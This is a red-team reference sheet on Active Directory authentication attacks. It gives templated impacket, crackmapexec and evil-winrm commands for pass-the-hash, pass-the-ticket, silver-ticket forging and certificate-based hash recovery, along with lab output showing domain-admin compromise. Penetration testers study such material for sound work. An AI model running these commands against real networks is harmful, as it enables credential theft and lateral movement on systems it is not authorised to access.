<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# AD Authentication
## Tags
<details><summary>Tags (Click to expand)</summary><p>

Environment

		#@active #@directory #@activedirectory #@microsoft

Context

		#@pass #hash #@passthehash #@authenticate #@authentication #@KRB5CCNAME #@ccache #@kerberos #@ntlm #@kirbi #@ticket #@passtheticket #@auth

Tools

		#@impacket #@getst.py #@getst #@rubeus #@ticketconverter.py #@ticketconverter #@mimikatz

</p></details>

## References
* Flangvik PKI Abuse cheatsheet- <br />[https://gist.github.com/Flangvik/15c3007dcd57b742d4ee99502440b250](https://gist.github.com/Flangvik/15c3007dcd57b742d4ee99502440b250)

## Overview

* Many of the authentications below include the following TTPs:
*  [`Command and Scripting Interpreter` TTP](TTP/T1059_Command_and_Scripting_Interpreter/T1059.md)
	* When executing on a target system with PowerShell, Windows Command Shell, Unix targets' bash, etc.
* [`Valid Accounts -Local Accounts` TTP](TTP/T1078_Valid_Accounts/003_Local_Accounts/T1078.003.md)
	* Threat actors may authenticate with local accounts rather than through domain accounts
* [`Software Deployment Tools` TTP](TTP/T1072_Software_Deployment_Tools/T1072.md)
	* Leveraging access to compromised software deployment systems (e.g., Altiris) to pivot in the network.


#### NTLM
* General Methods
	* Pass-The-Hash (PTH) ([`Use Alternate Authentication Material - Pass the Hash` TTP](TTP/T1550_Use_Alternate_Authentication_Material/002_Pass_the_Hash/T1550.002.md))

##### From a Linux Machine

* SMB
	* Shell intended for file-transfer only
		* <details><summary>impacket's smbclient.py ([Impacket Tool Guide](Testaments_and_Books/Redvelations/Tools/Active_Directory_and_Windows/impacket.md)) (Click to expand)</summary><p>
			* Examples
				* Example 1: Password-Based

						smbclient.py $DOMAIN/$DOMAIN_USER:$PASSWORD@$TARGET
	* Sem-interactive Shell (Execution)
		* <details><summary>impacket's smbexec.py ([Impacket Tool Guide](Testaments_and_Books/Redvelations/Tools/Active_Directory_and_Windows/impacket.md)) (Click to expand)</summary><p>
			* Examples
				* Example 1: Password-Based

						smbexec.py $DOMAIN/$DOMAIN_USER:$PASSWORD@$TARGET
		* <details><summary>impacket's psexec.py  ([Impacket Tool Guide](Testaments_and_Books/Redvelations/Tools/Active_Directory_and_Windows/impacket.md)) (Click to expand)</summary><p>
			* Examples
				* Example 1: Password-based authentication

						psexec.py $DOMAIN/$DOMAIN_USER:$PASSWORD@$TARGET
	* Execute commands without a continuous shell
		* <details><summary>crackmapexec (Click to expand)</summary><p>
			* Examples
				* Example 1: Execute Command, Password Authentication

						crackmapexec smb -d $DOMAIN -u $DOMAIN_USER -p $PASSWORD $TARGET -x <command>
* RPC
	* Semi-interactive Shell (Execution)
		* <details><summary>impacket's dcomexec.py ([Impacket Tool Guide](Testaments_and_Books/Redvelations/Tools/Active_Directory_and_Windows/impacket.md)) (Click to expand)</summary><p>
			* Note: The tool did not work in lab testing using Windows 11 and Server 2019 targets.
			* References
				* [https://github.com/SecureAuthCorp/impacket/blob/master/examples/dcomexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/dcomexec.py)
				* [https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/](				https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/)
			* Examples
				* Example 1: ShellWindows (default) (9BA05972-F6A8-11CF-A442-00A0C90A8F39)

						dcomexec.py $DOMAIN/$DOMAIN_USER:$PASSWORD@$TARGET -object ShellWindows
				* Example 1: MMC20.Application (49B2791A-B1AE-4C90-9B8E-E860BA07F889)

						dcomexec.py $DOMAIN/$DOMAIN_USER:$PASSWORD@$TARGET -object MMC20
				* Example 3: ShellBrowserWindow (C08AFD90-F2A1-11D1-8455-00A0C91F3880)

						dcomexec.py $DOMAIN/$DOMAIN_USER:$PASSWORD@$TARGET -object ShellBrowserWindow
	* Query RPC
		* <details><summary>impacket's rpcclient.py ([Impacket Tool Guide](Testaments_and_Books/Redvelations/Tools/Active_Directory_and_Windows/impacket.md)) (Click to expand)</summary><p>
			* Examples
				* Example 1: Password-Based

						rpcclient.py $DOMAIN/$DOMAIN_USER:$PASSWORD@$TARGET
* RDP ([`Remote Services` TTP](TTP/T1021_Remote_Services/T1021.md))
	* <details><summary>impacket's rdp_check.py  ([Impacket Tool Guide](Testaments_and_Books/Redvelations/Tools/Active_Directory_and_Windows/impacket.md)) (Click to expand)</summary><p>
		* Examples
			* Example 1: Password-Based

					rdp_check.py $DOMAIN/$DOMAIN_USER:$PASSWORD@$TARGET
				* Example Output

						root@jack-Virtual-Machine:~# rdp_check.py $DOMAIN/$DOMAIN_USER:$PASSWORD@$TARGET
						Impacket v0.10.1.dev1+20220720.103933.3c6713e - Copyright 2022 SecureAuth Corporation

						[*] Access Granted
	* <details><summary>crackmapexec (Click to expand)</summary><p>
		* Examples
			* Example 1: Password-Based, Capture Screenshots

					crackmapexec rdp -u $DOMAIN_USER -p $PASSWORD -d $DOMAIN $TARGET
				* Targets can be a subnet or a single system
				* Example Output

						root@jack-Virtual-Machine:~# cme rdp -u $DOMAIN_USER -p $PASSWORD -d $DOMAIN --screenshot 10.0.0.0/24
						RDP         10.0.0.101      3389   WIN11            [*] Windows 10 or Windows Server 2016 Build 22000 (name:WIN11) (domain:microsoftdelivery.com) (nla:True)
						RDP         10.0.0.50       3389   APP              [*] Windows 10 or Windows Server 2016 Build 17763 (name:APP) (domain:microsoftdelivery.com) (nla:True)
						RDP         10.0.0.1        3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:microsoftdelivery.com) (nla:True)
						RDP         10.0.0.3        3389   CA               [*] Windows 10 or Windows Server 2016 Build 17763 (name:CA) (domain:microsoftdelivery.com) (nla:True)
						RDP         10.0.0.2        3389   DC02             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC02) (domain:microsoftdelivery.com) (nla:True)
						RDP         10.0.0.101      3389   WIN11            [+] microsoftdelivery.com\domain_admin:P@ssw0rd (Pwn3d!)
						RDP         10.0.0.50       3389   APP              [+] microsoftdelivery.com\domain_admin:P@ssw0rd (Pwn3d!)
						RDP         10.0.0.1        3389   DC01             [+] microsoftdelivery.com\domain_admin:P@ssw0rd (Pwn3d!)
						RDP         10.0.0.3        3389   CA               [+] microsoftdelivery.com\domain_admin:P@ssw0rd (Pwn3d!)
						RDP         10.0.0.101      3389   WIN11            Screenshot saved /root/.cme/screenshots/WIN11_10.0.0.101_2022-08-18_171433.png
						RDP         10.0.0.2        3389   DC02             [+] microsoftdelivery.com\domain_admin:P@ssw0rd (Pwn3d!)
						RDP         10.0.0.50       3389   APP              Screenshot saved /root/.cme/screenshots/APP_10.0.0.50_2022-08-18_171437.png
						RDP         10.0.0.3        3389   CA               Screenshot saved /root/.cme/screenshots/CA_10.0.0.3_2022-08-18_171443.png
						RDP         10.0.0.2        3389   DC02             Screenshot saved /root/.cme/screenshots/DC02_10.0.0.2_2022-08-18_171445.png
* LDAP
	* <details><summary>impacket's smbclient.py ([Impacket Tool Guide](Testaments_and_Books/Redvelations/Tools/Active_Directory_and_Windows/impacket.md)) (Click to expand)</summary><p>
		* Examples
			* Example 1: Password-Based

					.
* WMI ([`Remote Services` TTP](TTP/T1021_Remote_Services/T1021.md))
	* <details><summary>impacket's wmiexec.py ([Impacket Tool Guide](Testaments_and_Books/Redvelations/Tools/Active_Directory_and_Windows/impacket.md)) (Click to expand)</summary><p>
		* Examples
			* Example 1: Password-Based

					wmiexec.py $DOMAIN/$DOMAIN_USER:$PASSWORD@$TARGET
				* Example Output

						root@jack-Virtual-Machine:~/openvpn# wmiexec.py $DOMAIN/$DOMAIN_USER:$PASSWORD@$DOMAIN_CONTROLLER
						Impacket v0.10.1.dev1+20220720.103933.3c6713e - Copyright 2022 SecureAuth Corporation

						[*] SMBv3.0 dialect used
						[!] Launching semi-interactive shell - Careful what you execute
						[!] Press help for extra shell commands
* WinRM ([`Remote Services` TTP](TTP/T1021_Remote_Services/T1021.md))
	* <details><summary>evil-winrmm -<br />[https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm) (Click to expand)</summary><p>
		* Port
		* Note: This tool requires that "ruby-dev" is installed on the operating system to be effectively installed (that is, `apt install ruby` normally will not work for acquiring this tool).

				evil-winrm -i $TARGET_UP -u $DOMAIN_USER -p $PASSWORD

###### Authentication using certificate on Linux

1. Request an TGT on behalf of the account 
	* <details><summary>gettgtpkinit (Click to expand)</summary><p>
		* Example

			python3 gettgtpkinit.py $DOMAIN/$DOMAIN_USER -pfx-base64 $(cat <base64-cert.file>) -dc-ip $DC_IP out_tgt.ccache
1. Set the env var to the output TGT ccache

		export KRB5CCNAME=out_tgt.ccache
1. Get an NTHash for Pass-The-Hash from TGT, AS-REP-KEY-ENC is from the output of the command above.
	* <details><summary>getnthash.py (Click to expand)</summary><p>

			python3 getnthash.py -key <AS-REP-ENC-KEY> -dc-ip $DC_IP $DOMAIN/$DOMAIN_USER

##### Convert NTLM to Kerberos Silver Ticket
* References
	* NotMedic's Github: NetNTLMtoSilverTicket -<br />[https://github.com/NotMedic/NetNTLMtoSilverTicket](https://github.com/NotMedic/NetNTLMtoSilverTicket)
* Requirements
	* SPN of the service you want to access
	* domain SID
	* domain user account SID and account name with local admin access
	* domain group that user is a member of if it's group-based local admin
		* For the service, the most common will be cifs/ as it maps back to the HOST/ service
* Process
	1. Generate a Silver Ticket
		* <details><summary>Impacket's ticketer.py ([Impacket Tool Guide](Testaments_and_Books/Redvelations/Tools/Active_Directory_and_Windows/impacket.md)) (Click to expand)</summary><p>

				./ticketer.py -nthash 09e55a127f3d4e4957c77de30000502a -domain-sid S-1-5-21-7375663-6890924511-1272660413 -domain DOMAIN.COM -spn cifs/SERVER.DOMAIN.COM -user-id 123456 -groups 4321 username
	1. Set the generated ccache file to the appropriate environment variable

				export KRB5CCNAME=/root/Assessments/NTLMTest/USERNAME.ccache

##### Certificates ([`Use Alternate Authentication Material` TTP](TTP/T1550_Use_Alternate_Authentication_Material/T1550.md))

* Request an TGT on behalf of the account 
	* <details><summary>gettgtpkinit (Click to expand)</summary><p>

			python3 gettgtpkinit.py $DOMAIN/$DOMAIN_USER -pfx-base64 $(cat <base64-cert.file>) -dc-ip $DC_IP out_tgt.ccache
* Set the env var to the output TGT ccache

		export KRB5CCNAME=out_tgt.ccache
* Get an NTHash for Pass-The-Hash from TGT, AS-REP-KEY-ENC is from the output of the command above.
	* <details><summary>getnthash (Click to expand)</summary><p>

			python3 getnthash.py -key <AS-REP-ENC-KEY> -dc-ip $DC_IP $DOMAIN/$DOMAIN_USER
* Certificate Authentication When PKINIT Is Not Supported
	* References
		* [https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
* Smart Card Emulation
	* RDP/Citrix ([`Remote Services` TTP](TTP/T1021_Remote_Services/T1021.md))
		* PIVert (no physical smart card required) -<br />[https://github.com/CCob/PIVert](https://github.com/CCob/PIVert)
* Manual
	* <details><summary>References (Click to expand)</summary><p>
		* [https://twitter.com/an0n_r0/status/1560699385545195521](https://twitter.com/an0n_r0/status/1560699385545195521)
	* <details><summary>Process (Click to expand)</summary><p>
		1. Use a virtual  to emulate a smart card reader through softrware in the PC/SC Smart Card Daemon. Just add vpcd into pcscd.
			* vsmartcard -<br />[https://github.com/frankmorgner/vsmartcard.git](https://github.com/frankmorgner/vsmartcard.git)
				* References
					* Frank Morgner Blog: Virtual Smart Card -<br />[https://frankmorgner.github.io/vsmartcard/virtualsmartcard/README.html](https://frankmorgner.github.io/vsmartcard/virtualsmartcard/README.html)
		1. Insert a proper smart card into the virtual smart card reader device.
			* Simulated
				* PIV with PivApplet
					* A Personal Identity Verification compatible JavaCard applet 
					* References
						* https://github.com/OpenSC/OpenSC/wiki/Smart-Card-Simulation#simulating-piv, 
				* Use jCardSim with this 
					* [https://jcardsim.org]
		1. If the PivApplet smartcard is initialized in the virtual reader, it is possible to upload the pfx logon certificate (with the private key) to it.
			* To interact with PivApplet in the reader:
				* Yubico -<br />[https://developers.yubico.com/yubico-piv-tool/](https://developers.yubico.com/yubico-piv-tool/)
		1. Local setup complete. Now pass throuh a local smart card (even virtual) for remote logins (e.g., xfreerdp /smartcap option)
			* FreeRDP -<br />[https://github.com/FreeRDP/FreeRDP](https://github.com/FreeRDP/FreeRDP)

					xfreerdp /smartcard
				* Now everything is prepared locally. FreeRDP  supports passing through a local smartcard device (even virtual) for remote logons (use xfreerdp /smartcard option), so nothing stops us from authenticating into an RDP session
				* Use a logon certificate.


##### From a Windows Machine
###### Local
###### Remote

#### Kerberos
##### From a Linux Machine

* <details><summary>Process (Click to expand)</summary><p>
	1. Retrieve the `.ccache` file
		* Recommended: Impacket: getST.py ([Impacket Tool Guide](Testaments_and_Books/Redvelations/Tools/Active_Directory_and_Windows/impacket.md))

				getST.py -spn host/<server_FQDN> $DOMAIN/<MACHINE-Acct_escaped_\$>:$PASSWORD -impersonate DOMAIN_ADMIN_USER_NAME
	1. Inject the ticket
		* Export ccache to environment variables

					export KRB5CCNAME=DOMAIN_ADMIN_USER_NAME.ccache
		* Tool adjustments
			* Many tools take these two flags to switch to kerberos:
				* `-k` - The explicit Kerberos Auth flag
				* `-n` or `-no-pass` - The flag for "no password prompt"
	1. Authenticate
* <details><summary>Other (Click to expand)</summary><p>
	* RC4 Keys Enabled (NT Hash)
		* "Overpass the hash"
	* Dicovered Credentials
		* LM
		* Pass the Cache (Discovered Kerb)
	* Pass the Hash
		1. Pass the Key
			* Requires DA?
			* NT Hash

					getTGT.py -hashes 'LMhash:NThash' $DOMAIN/$USER@$TARGET
			* AES Key
			
					getTGT.py -aesKey 'KerberosKey' $DOMAIN/$USER@$TARGET
		1. Pass the Ticket ([`Use Alternate Authentication Material - Pass the Ticket` (Defense Evasion) TTP](TTP/T1550_Use_Alternate_Authentication_Material/003_Pass_the_Ticket/T1550.003.md), [`Use Alternate Authentication Material - Pass the Ticket` TTP](TTP/T1550_Use_Alternate_Authentication_Material/003_Pass_the_Ticket/T1550.003.md))
			* Convert formats between Windows/Unix
				* Windows to UNIX
				
						ticketConverter.py $ticket.kirbi $ticket.ccache
				* UNIX to Windows
					
						ticketConverter.py $ticket.ccache $ticket.kirbi

* [https://github.com/NotMedic/NetNTLMtoSilverTicket](https://github.com/NotMedic/NetNTLMtoSilverTicket)

##### From a Windows Machine
###### Local
* Tools: Mimikatz, Rubeus
* The tools inject the ticket into memory, where the native Microsoft tools then use the ticket as normal.

###### Remote





